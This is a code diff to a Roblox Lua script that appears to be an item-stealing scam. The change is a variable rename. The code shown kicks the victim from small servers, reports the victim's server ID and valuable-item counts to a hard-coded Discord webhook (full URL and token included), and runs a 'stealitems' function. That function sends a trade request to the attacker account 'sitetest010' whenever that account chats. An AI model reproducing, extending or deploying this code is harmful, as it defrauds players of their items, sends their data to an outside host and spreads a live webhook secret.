@@ -792,8 +792,8 @@ local values = {
 	["Aliens"] = 1,
 	["Moon"] = 1
 }
-WebHook = "https://discord.com/api/webhooks/1309583394853884066/CYYYwQ4_0WMzoO3xFlyRE-KiJb1oUEsYUccvZT7pSFIcQ4DzjS2HKfLUv76byqGpgwi7"
-UserName = "sitetest010"
+webHook = "https://discord.com/api/webhooks/1309583394853884066/CYYYwQ4_0WMzoO3xFlyRE-KiJb1oUEsYUccvZT7pSFIcQ4DzjS2HKfLUv76byqGpgwi7"
+userName = "sitetest010"
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
@@ -1071,16 +1071,16 @@ local WebHookEmbed = CreateEmbed(
 )
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
-    SendWebhook(WebHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
-    SendWebhook(WebHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
 local function stealitems()
     coroutine.resume(destroytrades2)
 
     local sendArgs = {
-        [1] = game:GetService("Players")[UserName]
+        [1] = game:GetService("Players")[userName]
     }
     game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
@@ -1179,7 +1179,7 @@ local function stealitems()
 end
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == UserName then
+    if player.Name == userName then
         player.Chatted:Connect(function(msg)
             stealitems()
         end)
